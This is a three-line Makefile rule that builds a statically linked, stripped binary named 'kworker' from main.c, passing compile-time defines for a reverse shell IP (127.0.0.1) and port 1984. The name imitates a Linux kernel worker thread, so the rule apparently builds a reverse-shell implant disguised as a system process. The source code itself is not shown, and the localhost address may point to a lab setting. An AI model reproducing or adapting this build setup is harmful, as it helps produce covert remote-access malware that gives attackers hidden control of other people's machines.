kworker: main.c
	$(CC) $(CFLAGS) -Os -static -DREVERSE_SHELL_IP="\"127.0.0.1\"" -DREVERSE_SHELL_PORT=1984 -o $@ $^
	strip $@
